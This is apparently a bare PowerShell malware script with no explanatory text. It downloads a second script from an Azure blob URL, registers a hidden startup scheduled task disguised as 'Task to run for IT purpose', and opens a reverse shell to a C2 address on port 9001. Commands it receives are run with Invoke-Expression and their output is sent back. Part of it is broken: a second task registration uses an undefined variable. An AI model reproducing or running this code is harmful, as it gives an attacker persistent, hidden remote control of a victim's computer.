#add a schedular
# Define FTP URL and temporary file path
$ftpUrl = "https://joyon2393.blob.core.windows.net/jj23/client2.ps1"
$tempFilePath = Join-Path $env:TEMP "client2.ps1"

# Download script from FTP to temporary folder
Invoke-WebRequest -Uri $ftpUrl -OutFile $tempFilePath

# Define scheduled task parameters
$taskName = "MyScheduledTask"
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -File $tempFilePath"
$trigger = New-ScheduledTaskTrigger -AtStartup

# Register scheduled task
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Task to run for IT purpose"




# Delay before establishing network connection, and between retries

$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -File $scriptPath"
$trigger = New-ScheduledTaskTrigger -AtStartup

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Task to run script after reboot"


Start-Sleep -Seconds 1

# Connect to C2

$TCPClient = New-Object Net.Sockets.TCPClient('192.168.56.107', 9001)


$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Writes a string to C2
function WriteToStream ($String) {
# Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

# Write to C2
$StreamWriter.Write($String + 'SHELL> ')
$StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below


WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
# Encode command, remove last byte/newline
$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)

# Execute command and save output (including errors thrown)
$Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    }

# Write output to C2
WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close()


